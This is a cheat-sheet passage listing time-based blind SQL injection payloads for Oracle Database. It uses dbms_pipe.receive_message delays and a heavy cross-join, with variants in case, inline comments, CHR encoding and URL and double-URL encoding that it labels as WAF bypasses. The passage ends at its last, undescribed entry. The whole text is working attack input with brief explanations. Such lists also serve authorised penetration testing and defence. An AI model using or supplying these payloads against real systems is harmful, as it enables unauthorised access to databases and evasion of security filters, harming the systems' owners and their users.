# Oracle Database

These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.

- **' AND dbms_pipe.receive_message('a',5)=0 --**  
  Standard pipe receive for 5-second delay.
- **'||dbms_pipe.receive_message('a',5) --**  
  Concatenation-based pipe delay.
- **' AND 1=(SELECT COUNT(*) FROM all_users t1, all_users t2, all_users t3, all_users t4 WHERE ROWNUM=1) --**  
  Heavy cross-join count for computation delay.
- **' AND (CASE WHEN 1=1 THEN dbms_pipe.receive_message('a',5) ELSE 0 END)=0 --**  
  Conditional pipe delay.
- **' aNd DbMs_PiPe.ReCeIvE_MeSsAgE('a',5)=0 --**  
  Case variation to bypass WAF.
- **'/*comment*/AND/*comment*/dbms_pipe.receive_message('a',5)=0 --**  
  Inline comments for WAF bypass.
- **' AND dbms_pipe.receive_message(chr(97),5)=0 --**  
  CHR function encoding for 'a'.
- **%27%20AND%20dbms_pipe.receive_message(%27a%27,5)=0%20--**  
  URL-encoded payload.
- **%2527%20AND%20dbms_pipe.receive_message(%2527a%2527,5)=0%20--**  
